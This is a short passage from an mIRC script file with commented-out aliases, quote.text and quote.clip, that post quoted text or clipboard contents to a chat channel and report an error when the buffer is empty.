n551=;  if (%quote.text. [ $+ [ $network ] ] != $null) { say $report($null,$null,$chr(126) $+ $token(%quote.text. [ $+ [ $network ] ] ,3,46) $+ $chr(126)) 1 $$?="Text after quote:" | halt }
n552=;  else { $report($null,Error,$null,quote.text Failed,Buffer Empty).active }
n553=;}
n554=;/quote.clip {
n555=;  if ($1 != $null) { say $report($null,$null,$chr(126) $+ $cb $+ $chr(126)) 1 $1- | halt }
n556=;  elseif ($cb != $null) { say $report($null,$null,$chr(126) $+ $cb $+ $chr(126)) 1 $$?="Text after quote:" | halt }
n557=;  else { $report($null,Error,$null,quote.clip failed,Buffer Empty).active }
n558=;}
